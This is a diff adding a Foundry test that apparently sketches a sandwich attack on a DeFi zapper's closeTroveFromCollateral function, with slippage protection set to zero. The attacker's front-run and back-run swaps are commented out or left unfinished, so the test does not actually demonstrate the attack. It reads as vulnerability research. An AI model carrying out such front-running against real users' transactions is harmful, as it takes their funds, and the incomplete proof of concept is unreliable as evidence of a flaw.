@@ -310,6 +310,71 @@ contract ZapperLeverageMainnet is DevTestSetup {
         address batchManager;
     }
 
+
+    function testSandwichAttackOnCloseTrove() public {
+        
+        // 1. Setup: Initial Conditions
+        priceFeed.setPrice(2000 ether); // Initial ETH price
+        
+        deal(address(WETH), A, 100 ether); // Give user A some WETH
+        
+        // Open a Trove
+        IZapper.OpenTroveParams memory params = IZapper.OpenTroveParams({
+            owner: A,
+            ownerIndex: 0,
+            collAmount: 100 ether,
+            boldAmount: 10000e18,
+            upperHint: 0,
+            lowerHint: 0,
+            annualInterestRate: MIN_ANNUAL_INTEREST_RATE,
+            batchManager: address(0),
+            maxUpfrontFee: 1000e18,
+            addManager: address(0),
+            removeManager: address(0),
+            receiver: address(0)
+        });
+        vm.startPrank(A);
+        uint256 troveId = wethZapper.openTroveWithRawETH{value: 10 ether + ETH_GAS_COMPENSATION}(params);
+        vm.stopPrank();
+        
+        // 2. Attacker's Actions (Sandwich Attack)
+        
+        // --- Before the Victim's Transaction ---
+        
+        /**
+         * 
+        // Attacker buys BOLD to increase its price
+        vm.startPrank(B);
+        deal(address(WETH), address(this), 10 ether); // Fund this contract with WETH for the attack
+        WETH.approve(address(hybridCurveUniV3ExchangeHelpers), 10 ether);
+        // Simulate buying BOLD on Curve to increase its price
+        hybridCurveUniV3ExchangeHelpers.swapToBold(10 ether, 0); // Swap WETH for BOLD (no slippage protection)
+        vm.stopPrank();
+        
+         */
+        // --- Victim's Transaction ---
+        // Victim attempts to close the trove
+        uint256 initialWETHBalance = WETH.balanceOf(A);
+        vm.startPrank(A);
+        
+        // Calculate minExpectedCollateral (approximate, for testing)
+        uint256 minExpectedCollateral = 0; // Set to 0 to bypass the check for testing purposes
+        wethZapper.closeTroveFromCollateral(troveId, 10 ether, minExpectedCollateral); // Use closeTroveFromCollateral
+        vm.stopPrank();
+        uint256 finalWETHBalance = WETH.balanceOf(A);
+        
+        // --- After the Victim's Transaction ---
+        // Attacker sells BOLD to decrease its price (optional)
+        // vm.startPrank(B);
+        // usdcCurvePool.swapFromBold(..., 0); // Swap BOLD for WETH (no slippage protection)
+        // vm.stopPrank();
+        
+        // 3. Assertions: Verify the Attack's Success
+        // Assert that the victim received less WETH than expected
+        assertLt(finalWETHBalance - initialWETHBalance, 9 ether, "Victim received more WETH than expected"); // Adjust the expected amount based on your setup
+    }
+
+
     function openLeveragedTroveWithIndex(OpenLeveragedTroveWithIndexParams memory _inputParams)
         internal
         returns (uint256, uint256)
